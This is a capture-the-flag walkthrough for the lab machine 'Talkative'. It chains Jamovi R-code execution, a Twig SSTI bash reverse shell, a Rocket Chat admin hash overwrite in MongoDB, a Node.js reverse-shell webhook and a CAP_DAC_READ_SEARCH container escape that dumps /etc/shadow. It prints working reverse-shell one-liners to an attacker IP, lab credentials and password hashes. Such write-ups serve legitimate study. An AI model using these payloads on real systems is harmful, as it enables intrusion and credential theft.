# Talkative

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.113
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 08:13 EDT
Warning: 10.129.227.113 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.227.113
Host is up (0.012s latency).
Not shown: 65181 closed tcp ports (conn-refused), 350 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3000/tcp open     ppp
8080/tcp open     http-proxy
8081/tcp open     blackice-icecap
8082/tcp open     blackice-alerts
```

Lots of HTTP ports it seems. We can add `talkative.htb` to our `/etc/hosts` file to view these sites. Also, SSH seems to be blocked, so we probably need to access from within a shell.&#x20;

### Talkative

Port 80 hosts a normal corporate website:

<figure><img src="../../../.gitbook/assets/image (1926).png" alt=""><figcaption></figcaption></figure>

This site had some usernames and emails that we can take note of for now.

<figure><img src="../../../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>

```
matt@talkative.htb
saul@talkative.htb
janit@talkative.htb
```

Other than that, there's nothing much here.&#x20;

### Rocket Chat

On port 3000, there was a Rocket Chat instance.&#x20;

<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

We have no credentials, so let's move on for now.

### Jamovi

On port 8080, I found a Jamovi instance:

<figure><img src="../../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

This is a statistical software that is used for data analytics. The more interesting part is, we can run R code using the Rj editor. R can be used to execute system commands via the `system` function.

{% embed url="https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/system" %}

<figure><img src="../../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>

We now have a very simple RCE on the machine. We can get a reverse shell using a simple `bash` script.&#x20;

<figure><img src="../../../.gitbook/assets/image (3819).png" alt=""><figcaption></figcaption></figure>

### Docker Enum --> Bolt Creds

We can take a look within this Docker and see if we can find any sensitive files. Within the `/root` directory, we can find some files regarding Bolt:

```
root@b06821bbda78:~# ls -la
total 28
drwx------ 1 root root 4096 Mar  7  2022 .
drwxr-xr-x 1 root root 4096 Mar  7  2022 ..
lrwxrwxrwx 1 root root    9 Mar  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 3 root root 4096 May  1 12:18 .jamovi
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 2 root root 4096 Aug 15  2021 Documents
-rw-r--r-- 1 root root 2192 Aug 15  2021 bolt-administration.omv
```

I transferred the `bolt-administration.omv` file back to my machine via `base64` encoding. Then, we can `unzip` this file and read the data within. The `xdata.json` file had some credentials:

```
$ cat xdata.json | jq
{
  "A": {
    "labels": [
      [
        0,
        "Username",
        "Username",
        false
      ],
      [
        1,
        "matt@talkative.htb",
        "matt@talkative.htb",
        false
      ],
      [
        2,
        "janit@talkative.htb",
        "janit@talkative.htb",
        false
      ],
      [
        3,
        "saul@talkative.htb",
        "saul@talkative.htb",
        false
      ]
    ]
  },
  "B": {
    "labels": [
      [
        0,
        "Password",
        "Password",
        false
      ],
      [
        1,
        "jeO09ufhWD<s",
        "jeO09ufhWD<s",
        false
      ],
      [
        2,
        "bZ89h}V<S_DA",
        "bZ89h}V<S_DA",
        false
      ],
      [
        3,
        ")SQWGm>9KHEA",
        ")SQWGm>9KHEA",
        false
      ]
    ]
  },
  "C": {
    "labels": []
  }
}
```

Now that we have some credentials, we need to find the Bolt login page. Normally, this is at the `/bolt` directory. We can find this login page at `talkative.htb/bolt`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2472).png" alt=""><figcaption></figcaption></figure>

We can login with `saul@talkative.htb:jeO09ufhWD<s`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>

### Bolt RCE

This version of Bolt doesn't have any obvious vulnerabilities, so let's take a look at the File Management System since that is the most interesting. It appears that we can edit the themes and templates used for this machine:

<figure><img src="../../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

The page seems to use Twig templates to display the webpages:

<figure><img src="../../../.gitbook/assets/image (798).png" alt=""><figcaption></figcaption></figure>

This means that we can probably execute code using SSTI via Twig templates. I added this one liner to the script and saved the changes.

```
{{['bash -c "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1"']|filter('system')}}
```

Then, we need to head to Maintenance > Clear Cache, and reload the main page afterwards. Our listener port would catch a reverse shell.

<figure><img src="../../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>

### Docker Escape --> User&#x20;

We had access to yet another Docker container. However, there was really nothing here that I could find or exploit. I tried to `ssh` to `172.17.0.1` as `saul`, and it worked surprisingly.

```
www-data@f61dc505f7d6:/var/www/talkative.htb$ ssh saul@172.17.0.1
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
saul@172.17.0.1's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 May 2023 12:42:50 PM UTC

  System load:                      0.0
  Usage of /:                       79.4% of 8.80GB
  Memory usage:                     74%
  Swap usage:                       0%
  Processes:                        375
  Users logged in:                  0
  IPv4 address for br-ea74c394a147: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.227.113
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:37e9


18 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

saul@talkative:~$ id
uid=1000(saul) gid=1000(saul) groups=1000(saul)
```

Here, we can grab the user flag.

## Privilege Escalation

### Docker Discovery

I enumerated the processes operating on the system, and found a load of Docker containers being run.

```
saul@talkative:~$ ps auxww | grep dock
root         956  0.0  2.4 1455780 50132 ?       Ssl  12:12   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1289  0.0  0.1 1148844 3740 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1294  0.0  0.1 1222576 3712 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1316  0.0  0.1 1148844 3808 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1323  0.0  0.1 1075368 3924 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1337  0.0  0.1 1222576 3760 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1346  0.0  0.1 1075368 3776 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1480  0.0  0.1 1148844 3872 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.3 -container-port 3000
root        1661  0.0  0.1 1222576 3856 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.4 -container-port 80
root        1772  0.0  0.1 1148844 3848 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.5 -container-port 80
root        1886  0.0  0.1 1148844 3816 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.6 -container-port 80
root        1999  0.0  0.1 1149100 3840 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.7 -container-port 80
root        2110  0.0  0.1 1149100 3948 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.8 -container-port 80
root        2221  0.0  0.1 1075112 3840 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.9 -container-port 80
root        2336  0.0  0.1 1222832 3848 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.10 -container-port 80
root        2450  0.0  0.1 1148844 3876 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.11 -container-port 80
root        2565  0.0  0.1 1075112 3832 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.12 -container-port 80
root        2671  0.0  0.1 1075112 3936 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.13 -container-port 80
root        2786  0.0  0.1 1222576 3744 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.14 -container-port 80
root        2895  0.0  0.1 1222576 3732 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.15 -container-port 80
root        3008  0.0  0.1 1075368 3824 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.16 -container-port 80
root        3122  0.0  0.1 1148844 3680 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.17 -container-port 80
root        3236  0.0  0.1 1148844 3876 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.18 -container-port 80
root        3348  0.0  0.1 1149100 3860 ?        Sl   12:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.19 -container-port 80
saul        4357  0.0  0.0   6300   660 pts/0    S+   12:45   0:00 grep --color=auto dock
```

All of the Docker containers are hosted on 172.18.0.1/24 it appears. There are also a lot of Docker containers on 172.17.0.0/24 that are hosting the port 80 instance. I noticed that they skipped 172.17.0.2, and I wanted to see if it existed via `ping`.

```
saul@talkative:~$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.106 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.106/0.106/0.106/0.000 ms
```

So this machine exists. We can download the `nmap` binary onto the machine and scan this host.&#x20;

```
saul@talkative:~$ ./nmap_binary -p- --min-rate 10000 172.17.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-05-01 12:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

Port 27017 for MongoDB is open, and we can forward this using `chisel`.&#x20;

```bash
# on kali
chisel server -p 5555 --reverse
# on victim
./chisel client 10.10.14.13:5555 R:27017:172.17.0.2:27017
```

Then, we can enumerate port 27017 for ourselves. Since it is running on our localhost, we can use `mongo` to interact with it.&#x20;

### Mongo Enum

We can first view the databases present:

```
rs0:PRIMARY> show dbs
admin   0.000GB
config  0.000GB
local   0.011GB
meteor  0.004GB
```

Seems that `meteor` is the one from the machine. This database contains information regarding Rocket Chat:

```
rs0:PRIMARY> use meteor
switched to db meteor
rs0:PRIMARY> show collections
_raix_push_app_tokens
_raix_push_notifications
instances
meteor_accounts_loginServiceConfiguration
meteor_oauth_pendingCredentials
meteor_oauth_pendingRequestTokens
migrations
rocketchat__trash
rocketchat_apps
rocketchat_apps_logs
rocketchat_apps_persistence
rocketchat_avatars
rocketchat_avatars.chunks
rocketchat_avatars.files
rocketchat_credential_tokens
rocketchat_cron_history
rocketchat_custom_emoji
rocketchat_custom_sounds
rocketchat_custom_user_status
rocketchat_export_operations
rocketchat_federation_dns_cache
rocketchat_federation_keys
rocketchat_federation_room_events
rocketchat_federation_servers
rocketchat_import
rocketchat_integration_history
rocketchat_integrations
rocketchat_invites
rocketchat_livechat_agent_activity
rocketchat_livechat_custom_field
rocketchat_livechat_department
rocketchat_livechat_department_agents
rocketchat_livechat_external_message
rocketchat_livechat_inquiry
rocketchat_livechat_office_hour
rocketchat_livechat_page_visited
rocketchat_livechat_trigger
rocketchat_livechat_visitor
rocketchat_message
rocketchat_message_read_receipt
rocketchat_oauth_apps
rocketchat_oembed_cache
rocketchat_permissions
rocketchat_reports
rocketchat_roles
rocketchat_room
rocketchat_sessions
rocketchat_settings
rocketchat_smarsh_history
rocketchat_statistics
rocketchat_subscription
rocketchat_uploads
rocketchat_user_data_files
rocketchat_webdav_accounts
system.views
ufsTokens
users
usersSessions
view_livechat_queue_status
```

We can view the users present on the Rocket Chat instance.&#x20;

{% code overflow="wrap" %}
```
rs0:PRIMARY> db.users.find()
{ "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
{ "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y" }, "email" : { "verificationTokens" : [ { "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", "address" : "saul@talkative.htb", "when" : ISODate("2021-08-10T19:49:48.738Z") } ] }, "resume" : { "loginTokens" : [ ] } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2023-05-01T12:23:09.128Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
```
{% endcode %}

We can sort of make out how there's an `admin` user that has a hashed Bcrypt password. What we can do is replace this with a hash of our own choosing and then login as the admin of Rocket Chat.&#x20;

{% code overflow="wrap" %}
```
rs0:PRIMARY> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$9bo11GKNB/W2jAxW3a.L4OvmplKUjOfaOKaLpKF6KTikZMidkCkbu"}}}});
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

rs0:PRIMARY> db.users.find()
{ "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
{ "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2a$10$9bo11GKNB/W2jAxW3a.L4OvmplKUjOfaOKaLpKF6KTikZMidkCkbu" } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2023-05-01T12:23:09.128Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
```
{% endcode %}

In this case, I just used a simple password of '12345'. Then we can login to Rocket Chat.

### Rocket Chat RCE

The Rocket Chat dashboard had nothong of interest:

<figure><img src="../../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

I was taking a look at the Administration panel and seeing what I could do, when I found this:

<figure><img src="../../../.gitbook/assets/image (3501).png" alt=""><figcaption></figcaption></figure>

This is sort of like plugins for Rocket Chat, and it appears I can add new ones via Webhooks:

<figure><img src="../../../.gitbook/assets/image (3467).png" alt=""><figcaption></figcaption></figure>

When we click Incoming, it appears we can run some type of Script here:

<figure><img src="../../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

Reading the documentation for Rocket Chat, it appears that this runs Javascript code!

{% embed url="https://docs.rocket.chat/use-rocket.chat/workspace-administration/integrations" %}

We can grab a quick node.js reverse shell and slap it in there.&#x20;

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.13", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

After renaming the post and which channel to put it at (use #general), there's a `curl` command generated at the bottom.

```bash
curl -X POST -H 'Content-Type: application/json' --data '{"text":"Example message","attachments":[{"title":"Rocket.Chat","title_link":"https://rocket.chat","text":"Rocket.Chat, the best open source chat","image_url":"/images/integration-attachment-example.png","color":"#764FA5"}]}' http://talkative.htb:3000/hooks/Csc8cKYTF7unv6NMQ/jqsXqgirwnZxXF7BLb4ooc3CYpKp8tbfmM5DA55tCL9vWjwb
```

Afterwards, we would catch a reverse shell on our listener port:

<figure><img src="../../../.gitbook/assets/image (4041).png" alt=""><figcaption></figcaption></figure>

### Docker Vulnerabilities

This Docker was almost completely empty. We didn't have any tools to run or anything really, and it was a bit difficult to progress from here. Since there was no applications on the machine and we are root, the vulnerability should have to do with Docker somehow.&#x20;

I enumerated a few things:

* Kernel Exploits
* Determined if there commands I could run by checjking the binaries present on the machine, and saw that we could run `node`, `perl` and `bash`. Nothing else.&#x20;
* Checked the file system for the 100th time to make sure I didn't miss an obvious file
* Checked the user capabilities

The last one proved to be interesting. Since we didn't have `capsh`, we could do it by reading `/proc/self/status`.&#x20;

```
root@c150397ccd63:/home# cat /proc/self/status
Name:   cat
Umask:  0022
State:  R (running)
Tgid:   73
Ngid:   0
Pid:    73
PPid:   52
TracerPid:      0
Uid:    0       0       0       0
Gid:    0       0       0       0
FDSize: 256
Groups:  
NStgid: 73
NSpid:  73
NSpgid: 73
NSsid:  51
VmPeak:     2432 kB
VmSize:     2432 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:       748 kB
VmRSS:       748 kB
RssAnon:              64 kB
RssFile:             684 kB
RssShmem:              0 kB
VmData:      312 kB
VmStk:       132 kB
VmExe:        28 kB
VmLib:      1428 kB
VmPTE:        44 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
CoreDumping:    0
THP_enabled:    1
Threads:        1
SigQ:   1/7484
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: 0000000000000000
CapInh: 0000000000000000
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: 0000000000000000
NoNewPrivs:     0
Seccomp:        2
Speculation_Store_Bypass:       thread force mitigated
Cpus_allowed:   00000000,00000000,00000000,00000003
Cpus_allowed_list:      0-1
Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:      0
voluntary_ctxt_switches:        0
nonvoluntary_ctxt_switches:     0
```

I checked `00000000a80425fd` using `capsh` on my own Kali machine and found that it meant these:

{% code overflow="wrap" %}
```
$ capsh --decode=00000000a80425fd
0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
{% endcode %}

It seems that we have the `CAP_DAC_READ_SEARCH` capability enabled. This capability allows us to bypass **all** file permissions and read any file. This means **any file, even those outside of the mountspace**. Since this is a Docker and (probably) is mounted on the main machine, this allows us to read all files within the main machine, including the root flag.

When searching for tools I could use to exploit, I came across this:

{% embed url="https://github.com/cdk-team/CDK" %}

This was a great tool kit to use to enumerate and exploit the capabilities within Containers that had nothing else to offer. From the repository, we can transfer it like so:

```bash
# on kali
nc -lvp 999 < cdk
# on docker
cat < /dev/tcp/10.10.14.13/999 > cdk
```

Then, the file would be downloaded. We can try running the exploit for our capability:

```
root@c150397ccd63:/home# ./cdk run cap-dac-read-search
Running with target: /etc/shadow, ref: /etc/hostname
root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18849:0:99999:7:::
sshd:*:18849:0:99999:7:::
systemd-coredump:!!:18849::::::
lxd:!:18849::::::
saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
```

Works! Now we could just read the root flag and be done with, but I wanted to get a proper shell.&#x20;

### Getting Shell

Using `cdk`, we can run this command to get a shell on the main machine.

```
./cdk run cap-dac-read-search /etc/hostname /
Running with target: /, ref: /etc/hostname
executing command(/bin/bash)...
root@c150397ccd63:/# id
uid=0(root) gid=0(root) groups=0(root)
root@c150397ccd63:/# hostname
c150397ccd63
root@c150397ccd63:/# ls /root
root.txt
```

With this, we just need to echo in a public key and we can SSH from `saul`.&#x20;

```bash
echo 'PUBLIC KEY' >> /root/.ssh/authorized_keys
# from saul
wget 10.10.14.13/id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@talkative.htb
```

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Rooted!
